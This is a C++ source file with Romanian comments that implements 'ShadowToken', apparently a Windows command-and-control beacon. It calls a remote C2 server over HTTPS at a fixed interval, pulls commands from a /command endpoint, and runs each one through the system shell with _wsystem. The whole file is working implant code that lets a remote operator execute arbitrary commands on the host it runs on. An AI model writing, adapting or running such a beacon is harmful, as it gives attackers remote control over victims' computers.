#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <thread>

#pragma comment(lib, "winhttp.lib")

namespace ShadowToken {

    class C2_HTTP {
    public:
        C2_HTTP(const std::wstring& serverAddress, int interval)
            : serverAddress(serverAddress), interval(interval) {}

        // Începe comunicarea beacon cu serverul C2
        void StartBeacon() {
            while (true) {
                if (SendBeacon()) {
                    std::wstring command = ReceiveCommand();
                    if (!command.empty()) {
                        ExecuteCommand(command);
                    }
                }
                std::this_thread::sleep_for(std::chrono::seconds(interval));
            }
        }

    private:
        std::wstring serverAddress;
        int interval;

        // Trimite un beacon simplu către serverul C2
        bool SendBeacon() {
            HINTERNET hSession = WinHttpOpen(L"ShadowToken Beacon/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) {
                std::cerr << "[Error] Nu s-a putut inițializa sesiunea WinHTTP: " << GetLastError() << std::endl;
                return false;
            }

            HINTERNET hConnect = WinHttpConnect(hSession, serverAddress.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (!hConnect) {
                std::cerr << "[Error] Nu s-a putut conecta la serverul C2: " << GetLastError() << std::endl;
                WinHttpCloseHandle(hSession);
                return false;
            }

            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/beacon", nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (!hRequest) {
                std::cerr << "[Error] Nu s-a putut inițializa cererea HTTP: " << GetLastError() << std::endl;
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return false;
            }

            bool result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                          WinHttpReceiveResponse(hRequest, nullptr);

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            if (result) {
                std::cout << "[Info] Beacon trimis cu succes către serverul C2." << std::endl;
            } else {
                std::cerr << "[Error] Beacon-ul nu a fost trimis: " << GetLastError() << std::endl;
            }

            return result;
        }

        // Primește comenzi de la serverul C2
        std::wstring ReceiveCommand() {
            HINTERNET hSession = WinHttpOpen(L"ShadowToken Command/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) {
                std::cerr << "[Error] Nu s-a putut inițializa sesiunea WinHTTP pentru comandă: " << GetLastError() << std::endl;
                return L"";
            }

            HINTERNET hConnect = WinHttpConnect(hSession, serverAddress.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (!hConnect) {
                std::cerr << "[Error] Nu s-a putut conecta la serverul C2 pentru comandă: " << GetLastError() << std::endl;
                WinHttpCloseHandle(hSession);
                return L"";
            }

            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/command", nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (!hRequest) {
                std::cerr << "[Error] Nu s-a putut inițializa cererea HTTP pentru comandă: " << GetLastError() << std::endl;
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return L"";
            }

            std::wstring command;
            if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                WinHttpReceiveResponse(hRequest, nullptr)) {
                
                DWORD size = 0;
                WinHttpQueryDataAvailable(hRequest, &size);
                
                if (size > 0) {
                    wchar_t* buffer = new wchar_t[size / sizeof(wchar_t) + 1];
                    DWORD bytesRead = 0;
                    WinHttpReadData(hRequest, buffer, size, &bytesRead);
                    buffer[bytesRead / sizeof(wchar_t)] = L'\0';
                    command = buffer;
                    delete[] buffer;
                }
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            if (!command.empty()) {
                std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
                std::cout << "[Info] Command received: " << converter.to_bytes(command) << std::endl;
            } else {
                std::cerr << "[Warning] Nicio comandă nouă primită de la serverul C2." << std::endl;
            }

            return command;
        }

        // Execută comanda primită de la serverul C2
        void ExecuteCommand(const std::wstring& command) {
            std::wcout << "[Executing Command] " << command << std::endl;
            // Exemplu: execută o comandă locală folosind shell-ul de comandă
            _wsystem(command.c_str());
        }
    };
}
